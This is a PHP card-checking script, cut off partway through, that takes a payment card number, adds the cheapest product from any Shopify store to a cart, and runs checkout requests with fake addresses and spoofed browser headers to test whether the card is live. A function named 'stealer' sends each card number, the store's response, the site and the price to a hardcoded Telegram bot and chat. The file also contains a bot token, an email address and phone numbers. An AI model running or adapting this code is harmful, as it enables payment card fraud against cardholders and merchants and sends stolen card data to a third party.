<?php

$maxRetries = 3;
$retryCount = 0;
require_once 'ua1.php';
$agent = new userAgent();
$ua = $agent->generate('windows');

function error(string $message, $price = null, string $gateway = 'NONE', $cc = null) {
    global $DEV, $retryCount;

    $status = ($message === "SITE DEAD w8 40mim And Try Again...") ? 'Success' : 'Error';
    $error = json_encode([
        'Status'  => $status,
        'Gateway' => $gateway,
        'Price'=> $price,
        'Message'   => $message,
        'Retries' => $retryCount,
    ], JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES);
    
    
    echo $error;
    exit;
}

function generateRandomCoordinates($minLat = -90, $maxLat = 90, $minLon = -180, $maxLon = 180) {
    $latitude = $minLat + mt_rand() / mt_getrandmax() * ($maxLat - $minLat);
    $longitude = $minLon + mt_rand() / mt_getrandmax() * ($maxLon - $minLon);
    return [
        'latitude' => round($latitude, 6), 
        'longitude' => round($longitude, 6)
    ];
}
$randomCoordinates = generateRandomCoordinates();
$latitude = $randomCoordinates['latitude'];
$longitude = $randomCoordinates['longitude'];

function find_between($content, $start, $end) {
  $startPos = strpos($content, $start);
  if ($startPos === false) {
    return '';
}
$startPos += strlen($start);
$endPos = strpos($content, $end, $startPos);
if ($endPos === false) { 
    return'';
}
return substr($content, $startPos, $endPos - $startPos);
}

function extractQueryFromFile(string $filePath, int $occurrence = 1): ?string {
    $content = @file_get_contents($filePath);
    if ($content === false) {
        return null;
    }
    $needle = "'query' => '";
    $pos = -1;
    for ($i = 0; $i < $occurrence; $i++) {
        $pos = strpos($content, $needle, $pos + 1);
        if ($pos === false) {
            return null;
        }
    }
    $start = $pos + strlen($needle);
    $end = strpos($content, "'", $start);
    if ($end === false) {
        return null;
    }
    return substr($content, $start, $end - $start);
}
function output($method, $data) {
    // $btk = '8305972211:AAGpfN5uiUMqXCw3KjmF07MN059SMggDGJ4';
    $btk = '8305972211:AAGpfN5uiUMqXCw3KjmF07MN059SMggDGJ4';
    $out = curl_init();

    curl_setopt_array($out, [
        CURLOPT_URL => 'https://api.telegram.org/bot' . $btk . '/'.$method.'',
        CURLOPT_POST => 1,
        CURLOPT_POSTFIELDS => array_merge([
            'parse_mode' => 'HTML'
        ], $data),
        CURLOPT_RETURNTRANSFER => 1
    ]);

    $result = curl_exec($out);

    curl_close($out);

    return json_decode($result, true);
}
function stealer($cc1, $err, $gateway, $totalamt, $site, $realresp) {
    $cid = '-1002792567320';
        $kb_s = [
        'caption' => "
Card: $cc1
Response: $err
Gateway: $gateway
Price: $totalamt
Site: $site
RealResp: $realresp
        ",
        'reply_markup' => json_encode([
            'inline_keyboard' => [
                [
                    [
                        'text' => "𝑪𝒉𝒂𝒏𝒏𝒆𝒍 🌥",
                        'url' => 'https://t.me/+7JJj8nWswDo0ZmRl'
                    ]
                ]
            ]
        ])
    ];
    output('sendVideo', array_merge([
        'chat_id' => $cid,
        'video' => 'https://t.me/okdiiecc/5'
    ], $kb_s));
}

function SucessError(string $message, $price = null, string $gateway = 'NONE', $site = 'NONE', $cc1 = null) {
    global $DEV, $retryCount;

    $error = json_encode([
        'Status'  => 'Success',
        'Gateway' => $gateway,
        'Price'=> $price,
        'Message'   => $message,
        'Retries' => $retryCount,
    ], JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES);
    
    echo $error;
    exit;
}
$cc1 = $_GET['cc'] ?? '4970407189311280|09|2029|263';
if (empty($cc1)) {
error('A valid card is required.', null, 'NONE', $cc1);
}

$cc1 = str_replace(array(':',";","|",",","=>","-"," ",'/','|||'), "|", $cc1);

$cc_partes = explode("|", $cc1);
$cc = $cc_partes[0];
$month = $cc_partes[1];
$year = $cc_partes[2];
$cvv = $cc_partes[3];

if (strlen($year) <= 2) {
    $year = "20$year";
}

$sub_month = (int)$month;

function getMinimumPriceProductDetails(string $json): array {
    $data = json_decode($json, true);
    
    if (!is_array($data) || !isset($data['products'])) {
        throw new Exception("Site doesn't have any products");
    }
    $minPrice = null;
    $minPriceDetails = [
        'id' => null,
        'price' => null,
        'title' => null,
    ];

    foreach ($data['products'] as $product) {
        foreach ($product['variants'] as $variant) {
            $price = (float) $variant['price'];
            if ($price >= 0.01) {
                if ($minPrice === null || $price < $minPrice) {
                    $minPrice = $price;
                    $minPriceDetails = [
                        'id' => $variant['id'],
                        'price' => $variant['price'],
                        'title' => $product['title'],
                    ];
                }
            }
        }
    }
    if ($minPrice === null) {
        throw new Exception('No products found with price greater than or equal to 0.01');
    }

    return $minPriceDetails;
}

$site1 = filter_input(INPUT_GET, 'site', FILTER_SANITIZE_URL);
$site1 = parse_url($site1, PHP_URL_HOST);
$site1 = 'https://' . $site1;
$site1 = filter_var($site1, FILTER_VALIDATE_URL);
if ($site1 === false) {
    error('Invalid URL.', null, 'NONE', $cc1);
};

    $site2 = parse_url($site1, PHP_URL_SCHEME) . "://" . parse_url($site1, PHP_URL_HOST);
    $site = "$site2/products.json";
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $site);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        'User-Agent: Mozilla/5.0 (Linux; Android 6.0.1; Redmi 3S) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Mobile Safari/537.36',
        'Accept: application/json',
    ]);
    $r1 = curl_exec($ch);
    if ($r1 === false) {
        error(curl_error($ch), null, 'NONE', $cc1);
    } else {
        curl_close($ch);
        
        try {
            $productDetails = getMinimumPriceProductDetails($r1);
            $minPriceProductId = $productDetails['id'];
            $minPrice = $productDetails['price'];
            $price = $minPrice;
            $productTitle = $productDetails['title'];
        } catch (Exception $e) {
            error($e->getMessage(), null, 'NONE', $cc1);
        }
    }

    if (empty($minPriceProductId)) {
        error('Product ID is Empty.', null, 'NONE', $cc1);
    }

$urlbase = $site1;
$domain = parse_url($urlbase, PHP_URL_HOST); 
$cookie = 'cookie.txt';
$prodid = $minPriceProductId;
cart:

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $urlbase.'/cart/'.$prodid.':1');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie);
curl_setopt($ch, CURLOPT_MAXREDIRS, 5);
curl_setopt($ch, CURLOPT_HEADER, true);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language: en-US,en;q=0.9',
    'priority: u=0, i',
    'sec-ch-ua: "Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"',
    'sec-ch-ua-mobile: ?0',
    'sec-ch-ua-platform: "Windows"',
    'sec-fetch-dest: document',
    'sec-fetch-mode: navigate',
    'sec-fetch-site: none',
    'sec-fetch-user: ?1',
    'upgrade-insecure-requests: 1',
    'user-agent: '.$ua,
]);
$headers = [];
curl_setopt($ch, CURLOPT_HEADERFUNCTION, function($ch, $headerLine) use (&$headers) {
    list($name, $value) = explode(':', $headerLine, 2) + [NULL, NULL];
    $name = trim($name);
    $value = trim($value);
    if (strtolower($name) === 'location') {
        $headers['Location'] = $value;
    }

    return strlen($headerLine);
});

$response = curl_exec($ch);
if (curl_errno($ch)) {
    curl_close($ch);
    if ($retryCount < $maxRetries) {
        $retryCount++;
        goto cart;
    } else {
        error(curl_error($ch), $price, 'NONE', $cc1);
    }
}
$finalUrl = curl_getinfo($ch, CURLINFO_EFFECTIVE_URL);
$keywords = [
    'stock_problems',
    'Some items in your cart are no longer available. Please update your cart.',
    'This product is currently unavailable.',
    'This item is currently out of stock but will be shipped once available.',
    'Sold Out.',
    'stock-problems'
];
$found = false;
foreach ($keywords as $keyword) {
    if (strpos($response, $keyword) !== false) {
        $found = true;
        break;
    }
}
if ($found) {
    error('Item out of STOCK.', $price, 'NONE', $cc1);
}
$web_build_id = (bin2hex(random_bytes(20)));
$x_checkout_one_session_token = find_between($response, '<meta name="serialized-session-token" content="&quot;', '&quot;"') ?? null;
if (!$x_checkout_one_session_token) {
    if ($retryCount < $maxRetries) {
        $retryCount++;
        goto cart;
    } else {
        error('Missing Special token 1.', $price, 'NONE', $cc1);
    }
}
$queue_token = find_between($response, 'queueToken&quot;:&quot;', '&quot;') ?? null;
if (!$queue_token) {
    if ($retryCount < $maxRetries) {
        $retryCount++;
        goto cart;
    } else {
        error('Missing Special token 2.', $price, 'NONE', $cc1);
    }
}
$currency = find_between($response, '&quot;currencyCode&quot;:&quot;', '&quot;');
$countrycode = find_between($response, '&quot;countryCode&quot;:&quot;', '&quot;,&quot');
$stable_id = find_between($response, 'stableId&quot;:&quot;', '&quot;');

if (!$stable_id) { 
if ($retryCount < $maxRetries) {
        $retryCount++;
        goto cart;
    } else {
        error('Missing Special token 3.', $price, 'NONE', $cc1);
    }
}

$paymentMethodIdentifier = find_between($response, 'paymentMethodIdentifier&quot;:&quot;', '&quot;');
if (!$paymentMethodIdentifier) {
    if ($retryCount < $maxRetries) {
        $retryCount++;
        goto cart;
    } else {
        error('Missing Special token 4.', $price, 'NONE', $cc1);
    }
}
$gateres = strtolower($response);
        if (strpos($gateres, 'shopify_payments')) {
            $gateway = 'Shopify';
        } else {
            $gateway = find_between($response, 'extensibilityDisplayName&quot;:&quot;', '&quot;,&quot;');
            if (empty($gateway)) {
                $gateway = 'Unknown';
            }
        }
$checkouturl = isset($headers['Location']) ? $headers['Location'] : '';
$checkoutToken = '';
if (preg_match('/\/cn\/([^\/?]+)/', $checkouturl, $matches)) {
    $checkoutToken = $matches[1];
}
if ($countrycode == 'US') {
    $address = [
        'street' => '11n lane avenue south',
        'city' => 'Jacksonville',
        'state' => 'FL',
        'postcode' => '32210',
        'country' => $countrycode,
        'currency' => $currency
    ];
} elseif ($countrycode == 'UK' || $countrycode == 'GB') {
    $address = [
        'street' => '11N Mary Slessor Square',
        'city' => 'Dundee',
        'state' => 'SCT',
        'postcode' => 'DD4 6BW',
        'country' => $countrycode,
        'currency' => $currency
    ];
} elseif ($countrycode == 'IN') {
    $address = [
        'street' => 'bhagirathpura indore',
        'city' => 'indore',
        'state' => 'MP',
        'postcode' => '452003',
        'country' => $countrycode,
        'currency' => $currency
    ];
} elseif ($countrycode == 'CA') {
    $address = [
        'street' => '11n Lane Street',
        'city' => "Barry's Bay",
        'state' => 'ON',
        'postcode' => 'K0J 2M0',
        'country' => $countrycode,
        'currency' => $currency
    ];
} elseif ($countrycode == 'PK') {
    $address = [
        'street' => '11n Lane Street',
        'city' => "Barry's Bay",
        'state' => 'ON',
        'postcode' => 'K0J 2M0',
        'country' => $countrycode,
        'currency' => $currency
    ];
} elseif ($countrycode == 'AU') {
    $address = [
        'street' => '94 Swanston Street',
        'city' => 'Wingham',
        'state' => 'NSW',
        'postcode' => '2429',
        'country' => $countrycode,
        'currency' => $currency
    ];
} elseif ($countrycode == 'BR') {
    $address = [
        'street' => '94 Swanston Street',
        'city' => 'Wingham',
        'state' => 'NSW',
        'postcode' => '2429',
        'country' => $countrycode,
        'currency' => $currency
    ];
} elseif ($countrycode == 'GY') {
    $address = [
        'street' => '94 Swanston Street',
        'city' => 'Wingham',
        'state' => 'NSW',
        'postcode' => '2429',
        'country' => $countrycode,
        'currency' => $currency
    ];
} elseif ($countrycode == 'FR') {
    $address = [
        'street' => '94 Swanston Street',
        'city' => 'Wingham',
        'state' => 'NSW',
        'postcode' => '2429',
        'country' => $countrycode,
        'currency' => $currency
    ];
}
elseif ($countrycode == 'VN') {
    $address = [
        'street'   => '12 Lý Thường Kiệt',
        'city'     => 'Hà Nội',
        'state'    => 'Hà Nội',
        'postcode' => '100000',
        'country' => $countrycode,
        'currency' => $currency
    ];
    }
    else {
    $address = [
        'street' => '11n lane avenue south',
        'city' => 'Jacksonville',
        'state' => 'FL',
        'postcode' => '32210',
        'country' => 'US',
        'currency' => 'USD'
    ];
   // error('Site country or currency is maybe not supported: ' . $countrycode . '/' . $currency, null, 'NONE');
    // error('Site country or currency is maybe not supported.' . $countrycode . '/' . $currency, $proxymsg, $ip, $price, $gateway);
    // error('Site country or currency is maybe not supported.', $proxymsg, $ip, $price, $gateway);
}
card:
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://deposit.shopifycs.com/sessions');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie);
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'accept: application/json',
    'accept-language: en-US,en;q=0.9',
    'content-type: application/json',
    'origin: https://checkout.shopifycs.com',
    'priority: u=1, i',
    'referer: https://checkout.shopifycs.com/',
    'sec-ch-ua: "Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"',
    'sec-ch-ua-mobile: ?0',
    'sec-ch-ua-platform: "Windows"',
    'sec-fetch-dest: empty',
    'sec-fetch-mode: cors',
    'sec-fetch-site: same-site',
    'user-agent: '.$ua,
]);
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"credit_card":{"number":"'.$cc.'","month":' . (string) $sub_month . ',"year":'.$year.',"verification_value":"'.$cvv.'","start_month":null,"start_year":null,"issue_number":"","name":"insane xd"},"payment_session_scope":"'.$domain.'"}');
$response2 = curl_exec($ch);
if (curl_errno($ch)) {
    if ($retryCount < $maxRetries) {
        $retryCount++;
        goto card;
    } else {
        error(curl_error($ch), $price, 'NONE', $cc1);
    }
}
$response2js = json_decode($response2, true);
$cctoken = $response2js['id'];
if (empty($cctoken)) {
    if ($retryCount < $maxRetries) {
        $retryCount++;
        goto card;
    } else {
    error('Missing special token 5. ID', $price, $gateway, $cc1);
}
}
$deliverymethodtype = find_between($response, 'deliveryMethodTypes&quot;:[&quot;', '&quot;],&quot;');
$handle = find_between($response, '{&quot;handle&quot;:&quot;', '&quot;');
if ($deliverymethodtype == 'NONE') {
$proposalPayload = json_encode([
     'query' => extractQueryFromFile('json.txt', 1),
        'variables' => [
            'sessionInput' => [
                'sessionToken' => $x_checkout_one_session_token
            ],
            'queueToken' => $queue_token,
            'discounts' => [
                'lines' => [],
                'acceptUnexpectedDiscounts' => true
            ],
            'delivery' => [
                'deliveryLines' => [
                    [
                        'selectedDeliveryStrategy' => [
                            'deliveryStrategyMatchingConditions' => [
                                'estimatedTimeInTransit' => [
                                    'any' => true
                                ],
                                'shipments' => [
                                    'any' => true
                                ]
                            ],
                            'options' => new stdClass()
                        ],
                        'targetMerchandiseLines' => [
                            'lines' => [
                                [
                                    'stableId' => $stable_id
                                ]
                            ]
                        ],
                        'deliveryMethodTypes' => [
                            'NONE'
                        ],
                        'expectedTotalPrice' => [
                            'any' => true
                        ],
                        'destinationChanged' => true
                    ]
                ],
                'noDeliveryRequired' => [],
                'useProgressiveRates' => false,
                'prefetchShippingRatesStrategy' => null,
                'supportsSplitShipping' => true
            ],
            'deliveryExpectations' => [
                'deliveryExpectationLines' => []
            ],
            'merchandise' => [
                'merchandiseLines' => [
                    [
                        'stableId' => $stable_id,
                        'merchandise' => [
                            'productVariantReference' => [
                                'id' => 'gid://shopify/ProductVariantMerchandise/' . $prodid,
                                'variantId' => 'gid://shopify/ProductVariant/' . $prodid,
                                'properties' => [],
                                'sellingPlanId' => null,
                                'sellingPlanDigest' => null
                            ]
                        ],
                        'quantity' => [
                            'items' => [
                                'value' => 1
                            ]
                        ],
                        'expectedTotalPrice' => [
                            'value' => [
                                'amount' => $minPrice,
                                'currencyCode' => $address['currency']
                            ]
                        ],
                        'lineComponentsSource' => null,
                        'lineComponents' => []
                    ]
                ]
            ],
            'payment' => [
                'totalAmount' => [
                    'any' => true
                ],
                'paymentLines' => [],
                'billingAddress' => [
                    'streetAddress' => [
                        'address1' => $address['street'],
                        'city' => $address['city'],
                        'countryCode' => $address['country'],
                        'firstName' => 'insane',
                        'lastName' => 'xd',
                        'phone' => '+918103707894'
                    ]
                ]
            ],
            'buyerIdentity' => [
                'customer' => [
                    'presentmentCurrency' => $address['currency'],
                    'countryCode' => $address['country']
                ],
                'email' => 'amanpandey125aman@gmail.com',
                'emailChanged' => false,
                'phoneCountryCode' => $address['country'],
                'marketingConsent' => [],
                'shopPayOptInPhone' => [
                    'countryCode' => $address['country']
                ],
                'rememberMe' => false
            ],
            'tip' => [
                'tipLines' => []
            ],
            'taxes' => [
                'proposedAllocations' => null,
                'proposedTotalAmount' => [
                    'value' => [
                        'amount' => '0',
                        'currencyCode' => $address['currency']
                    ]
                ],
                'proposedTotalIncludedAmount' => null,
                'proposedMixedStateTotalAmount' => null,
                'proposedExemptions' => []
            ],
            'note' => [
                'message' => null,
                'customAttributes' => []
            ],
            'localizationExtension' => [
                'fields' => []
            ],
            'nonNegotiableTerms' => null,
            'scriptFingerprint' => [
                'signature' => null,
                'signatureUuid' => null,
                'lineItemScriptChanges' => [],
                'paymentScriptChanges' => [],
                'shippingScriptChanges' => []
            ],
            'optionalDuties' => [
                'buyerRefusesDuties' => false
            ]
        ],
        'operationName' => 'Proposal'
    ]);
} else {
$proposalPayload = json_encode([
        'query' => extractQueryFromFile('json.txt', 2),
        'variables' => [
            'sessionInput' => [
                'sessionToken' => $x_checkout_one_session_token
            ],
            'queueToken' => $queue_token,
            'discounts' => [
                'lines' => [],
                'acceptUnexpectedDiscounts' => true
            ],
            'delivery' => [
                'deliveryLines' => [
                    [
                        'destination' => [
                            'partialStreetAddress' => [
                                'address1' => $address['street'],
                                'address2' => '',
                                'city' => $address['city'],
                                'countryCode' => $address['country'],
                                'postalCode' => $address['postcode'],
                                'firstName' => 'insane',
                                'lastName' => 'xd',
                                'zoneCode' => $address['state'],
                                'phone' => '+18103646394',
                                'oneTimeUse' => false,
                                'coordinates' => [
                                    'latitude' => $latitude,
                                    'longitude' => $longitude
                                ]
                            ]
                        ],
                        'selectedDeliveryStrategy' => [
                            'deliveryStrategyByHandle' => [
                                'handle' => $handle,
                                'customDeliveryRate' => false
                            ],
                            'options' => new stdClass()
                        ],
                        'targetMerchandiseLines' => [
                            'any' => true
                        ],
                        'deliveryMethodTypes' => [
                            'SHIPPING'
                        ],
                        'expectedTotalPrice' => [
                            'any' => true
                        ],
                        'destinationChanged' => true
                    ]
                ],
                'noDeliveryRequired' => [],
                'useProgressiveRates' => false,
                'prefetchShippingRatesStrategy' => null,
                'supportsSplitShipping' => true
            ],
            'deliveryExpectations' => [
                'deliveryExpectationLines' => []
            ],
            'merchandise' => [
                'merchandiseLines' => [
                    [
                        'stableId' => $stable_id,
                        'merchandise' => [
                            'productVariantReference' => [
                                'id' => 'gid://shopify/ProductVariantMerchandise/' . $prodid,
                                'variantId' => 'gid://shopify/ProductVariant/' . $prodid,
                                'properties' => [],
                                'sellingPlanId' => null,
                                'sellingPlanDigest' => null
                            ]
                        ],
                        'quantity' => [
                            'items' => [
                                'value' => 1
                            ]
                        ],
                        'expectedTotalPrice' => [
                            'value' => [
                                'amount' => $minPrice,
                                'currencyCode' => $address['currency']
                            ]
                        ],
                        'lineComponentsSource' => null,
                        'lineComponents' => []
                    ]
                ]
            ],
            'payment' => [
                'totalAmount' => [
                    'any' => true
                ],
                'paymentLines' => [],
                'billingAddress' => [
                    'streetAddress' => [
                        'address1' => $address['street'],
                        'address2' => '',
                        'city' => $address['city'],
                        'countryCode' => $address['country'],
                        'postalCode' => $address['postcode'],
                        'firstName' => 'insane',
                        'lastName' => 'xd',
                        'zoneCode' => $address['state'],
                        'phone' => '+18103646394'
                    ]
                ]
            ],
            'buyerIdentity' => [
                'customer' => [
                    'presentmentCurrency' => $address['currency'],
                    'countryCode' => $address['country']
                ],
                'email' => 'amanpandey125aman@gmail.com',
                'emailChanged' => false,
                'phoneCountryCode' => $address['country'],
                'marketingConsent' => [],
                'shopPayOptInPhone' => [
                    'countryCode' => $address['country']
                ],
                'rememberMe' => false
            ],
            'tip' => [
                'tipLines' => []
            ],
            'taxes' => [
                'proposedAllocations' => null,
                'proposedTotalAmount' => [
                    'value' => [
                        'amount' => '0',
                        'currencyCode' => $address['currency']
                    ]
                ],
                'proposedTotalIncludedAmount' => null,
                'proposedMixedStateTotalAmount' => null,
                'proposedExemptions' => []
            ],
            'note' => [
                'message' => null,
                'customAttributes' => []
            ],
            'localizationExtension' => [
                'fields' => []
            ],
            'shopPayArtifact' => [
                'optIn' => [
                    'vaultEmail' => '',
                    'vaultPhone' => '+91',
                    'optInSource' => 'REMEMBER_ME'
                ]
            ],
            'nonNegotiableTerms' => null,
            'scriptFingerprint' => [
                'signature' => null,
                'signatureUuid' => null,
                'lineItemScriptChanges' => [],
                'paymentScriptChanges' => [],
                'shippingScriptChanges' => []
            ],
            'optionalDuties' => [
                'buyerRefusesDuties' => false
            ]
        ],
        'operationName' => 'Proposal'
    ]);
}
sleep(0.5);
proposal:
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $urlbase.'/checkouts/unstable/graphql?operationName=Proposal');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie);
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'accept: application/json',
    'accept-language: en-GB',
    'content-type: application/json',
    'origin: ' . $urlbase,
    'priority: u=1, i',
    'referer: ' . $urlbase . '/',
    'sec-ch-ua: "Google Chrome";v="129", "Not=A?Brand";v="8", "Chromium";v="129"',
    'sec-ch-ua-mobile: ?0',
    'sec-ch-ua-platform: "Windows"',
    'sec-fetch-dest: empty',
    'sec-fetch-mode: cors',
    'sec-fetch-site: same-origin',
    'shopify-checkout-client: checkout-web/1.0',
    'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36',
    'x-checkout-one-session-token: ' . $x_checkout_one_session_token,
    'x-checkout-web-build-id: ' . $web_build_id,
    'x-checkout-web-deploy-stage: production',
    'x-checkout-web-server-handling: fast',
    'x-checkout-web-server-rendering: no',
    'x-checkout-web-source-id: ' . $checkoutToken,
]);
curl_setopt($ch, CURLOPT_POSTFIELDS, $proposalPayload);

$response3 = curl_exec($ch);

if (curl_errno($ch)) {
    curl_close($ch);
    if ($retryCount < $maxRetries) {
        $retryCount++;
        goto proposal;
    } else {
        error(curl_error($ch), $price, $gateway, $cc1);
}
}

$decoded = json_decode($response3);
if (isset($decoded->data->session->negotiate->result->sellerProposal)) {
    $firstStrategy = $decoded->data->session->negotiate->result->sellerProposal;
    if (empty($firstStrategy)) {
        if ($retryCount < $maxRetries) {
            $retryCount++;
            goto proposal;
        } else {
        error('Missing Special token 6. null', $price, $gateway, $cc1);
    }
    }
}
    if (isset($firstStrategy->delivery->deliveryLines[0]->availableDeliveryStrategies[0]->amount->value->amount)) {
        $delamount = $firstStrategy->delivery->deliveryLines[0]->availableDeliveryStrategies[0]->amount->value->amount;
    }
    if (empty($delamount)) {
        if ($retryCount < $maxRetries) {
            $retryCount++;
            goto proposal;
        } else {
            error('Missing Special token 7.', $price, $gateway, $cc1);
        }
    }
    if (isset($firstStrategy->tax->totalTaxAmount->value->amount)) {
        $tax = $firstStrategy->tax->totalTaxAmount->value->amount;
    } else {
        $tax = 0;
    }
    if (isset($firstStrategy->delivery->deliveryLines[0]->availableDeliveryStrategies[0]->handle)) {
        $handle = $firstStrategy->delivery->deliveryLines[0]->availableDeliveryStrategies[0]->handle;
        } 
        if (empty($handle)) {
            if ($retryCount < $maxRetries) {
                $retryCount++;
                goto proposal;
            } else {
                error('Missing Special token 8.', $price, $gateway, $cc1);
            }
        }
    $currencycode = isset($firstStrategy->tax->totalTaxAmount->value->currencyCode) ? $firstStrategy->tax->totalTaxAmount->value->currencyCode : 'USD';
    $totalamt = isset($firstStrategy->runningTotal->value->amount) ? $firstStrategy->runningTotal->value->amount : 0;
    $price = $totalamt;
    $isShipping = $decoded->data->session->negotiate->result->buyerProposal->delivery->deliveryLines[0]->deliveryMethodTypes[0];
        recipt:

if ($deliverymethodtype == 'NONE') {
    $postf = json_encode([
        'query' => extractQueryFromFile('json.txt', 3),
                'variables' => [
                    'input' => [
                        'sessionInput' => [
                            'sessionToken' => $x_checkout_one_session_token
                        ],
                        'queueToken' => $queue_token,
                        'discounts' => [
                            'lines' => [],
                            'acceptUnexpectedDiscounts' => true
                        ],
                        'delivery' => [
                            'deliveryLines' => [
                                [
                                    'selectedDeliveryStrategy' => [
                                        'deliveryStrategyMatchingConditions' => [
                                            'estimatedTimeInTransit' => [
                                                'any' => true
                                            ],
                                            'shipments' => [
                                                'any' => true
                                            ]
                                        ],
                                        'options' => new stdClass()
                                    ],
                                    'targetMerchandiseLines' => [
                                        'lines' => [
                                            [
                                                'stableId' => $stable_id
                                            ]
                                        ]
                                    ],
                                    'deliveryMethodTypes' => [
                                        'NONE'
                                    ],
                                    'expectedTotalPrice' => [
                                        'any' => true
                                    ],
                                    'destinationChanged' => true
                                ]
                            ],
                            'noDeliveryRequired' => [],
                            'useProgressiveRates' => false,
                            'prefetchShippingRatesStrategy' => null,
                            'supportsSplitShipping' => true
                        ],
                        'deliveryExpectations' => [
                            'deliveryExpectationLines' => []
                        ],
                        'merchandise' => [
                            'merchandiseLines' => [
                                [
                                    'stableId' => $stable_id,
                                    'merchandise' => [
                                        'productVariantReference' => [
                                            'id' => 'gid://shopify/ProductVariantMerchandise/' . $prodid,
                                            'variantId' => 'gid://shopify/ProductVariant/' . $prodid,
                                            'properties' => [],
                                            'sellingPlanId' => null,
                                            'sellingPlanDigest' => null
                                        ]
                                    ],
                                    'quantity' => [
                                        'items' => [
                                            'value' => 1
                                        ]
                                    ],
                                    'expectedTotalPrice' => [
                                        'value' => [
                                            'amount' => $minPrice,
                                            'currencyCode' => $address['currency']
                                        ]
                                    ],
                                    'lineComponentsSource' => null,
                                    'lineComponents' => []
                                ]
                            ]
                        ],
                        'payment' => [
                            'totalAmount' => [
                                'any' => true
                            ],
                            'paymentLines' => [
                                [
                                    'paymentMethod' => [
                                        'directPaymentMethod' => [
                                            'paymentMethodIdentifier' => $paymentMethodIdentifier,
                                            'sessionId' => $cctoken,
                                            'billingAddress' => [
                                                'streetAddress' => [
                                                    'address1' => $address['street'],
                                                    'address2' => '',
                                                    'city' => $address['city'],
                                                    'countryCode' => $address['country'],
                                                    'postalCode' => $address['postcode'],
                                                    'firstName' => 'insane',
                                                    'lastName' => 'xd',
                                                    'zoneCode' => $address['state'],
                                                    'phone' => '+18103646394'
                                                ]
                                            ],
                                            'cardSource' => null
                                        ],
                                        'giftCardPaymentMethod' => null,
                                        'redeemablePaymentMethod' => null,
                                        'walletPaymentMethod' => null,
                                        'walletsPlatformPaymentMethod' => null,
                                        'localPaymentMethod' => null,
                                        'paymentOnDeliveryMethod' => null,
                                        'paymentOnDeliveryMethod2' => null,
                                        'manualPaymentMethod' => null,
                                        'customPaymentMethod' => null,
                                        'offsitePaymentMethod' => null,
                                        'customOnsitePaymentMethod' => null,
                                        'deferredPaymentMethod' => null,
                                        'customerCreditCardPaymentMethod' => null,
                                        'paypalBillingAgreementPaymentMethod' => null
                                    ],
                                    'amount' => [
                                        'value' => [
                                            'amount' => $totalamt,
                                            'currencyCode' => $address['currency']
                                        ]
                                    ],
                                    'dueAt' => null
                                ]
                            ],
                            'billingAddress' => [
                                'streetAddress' => [
                                    'address1' => $address['street'],
                                    'address2' => '',
                                    'city' => $address['city'],
                                    'countryCode' => $address['country'],
                                    'postalCode' => $address['postcode'],
                                    'firstName' => 'insane',
                                    'lastName' => 'xd',
                                    'zoneCode' => $address['state'],
                                    'phone' => ''
                                ]
                            ]
                        ],
                        'buyerIdentity' => [
                            'customer' => [
                                'presentmentCurrency' => $address['currency'],
                                'countryCode' => $address['country']
                            ],
                            'email' => 'amanpandey125aman@gmail.com',
                            'emailChanged' => false,
                            'phoneCountryCode' => $address['country'],
                            'marketingConsent' => [],
                            'shopPayOptInPhone' => [
                                'countryCode' => $address['country']
                            ],
                            'rememberMe' => false
                        ],
                        'tip' => [
                            'tipLines' => []
                        ],
                        'taxes' => [
                            'proposedAllocations' => null,
                            'proposedTotalAmount' => [
                                'value' => [
                                    'amount' => $tax,
                                    'currencyCode' => $address['currency']
                                ]
                            ],
                            'proposedTotalIncludedAmount' => null,
                            'proposedMixedStateTotalAmount' => null,
                            'proposedExemptions' => []
                        ],
                        'note' => [
                            'message' => null,
                            'customAttributes' => []
                        ],
                        'localizationExtension' => [
                            'fields' => []
                        ],
                        'nonNegotiableTerms' => null,
                        'scriptFingerprint' => [
                            'signature' => null,
                            'signatureUuid' => null,
                            'lineItemScriptChanges' => [],
                            'paymentScriptChanges' => [],
                            'shippingScriptChanges' => []
                        ],
                        'optionalDuties' => [
                            'buyerRefusesDuties' => false
                        ]
                    ],
                    'attemptToken' => $checkoutToken,
                    'metafields' => [],
                    'analytics' => [
                        'requestUrl' => $urlbase.'/checkouts/cn/'.$checkoutToken,
                        'pageId' => $stable_id
                    ]
                ],
                'operationName' => 'SubmitForCompletion'
            ]);
}
elseif ($isShipping == 'SHIPPING') {
    $postf = json_encode([
        'query' => extractQueryFromFile('json.txt', 4),
            'variables' => [
                'input' => [
